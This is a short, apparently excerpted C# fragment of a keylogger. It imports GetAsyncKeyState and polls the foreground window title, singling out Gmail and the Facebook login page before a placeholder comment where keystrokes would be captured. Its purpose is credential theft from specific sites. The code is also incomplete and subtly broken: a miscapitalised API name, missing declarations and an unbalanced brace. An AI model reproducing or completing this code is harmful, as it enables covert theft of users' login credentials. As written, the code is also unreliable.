[DllImport("user32.dll")]
public static extern int GetAsyncKeyState(Int32 i);
while (true){
    IntPtr handle = GetForeGroundWindow();
    if (GetWindowText(handle, buff, chars) > 0)
    {
        string line = buff.ToString();
        if (line.Contains("Gmail")|| line.Contains("Facebook - Log In or Sign Up "))
        {
            //Check Keyboard
            
        }
    }
    Thread.Sleep(100);
    }
}
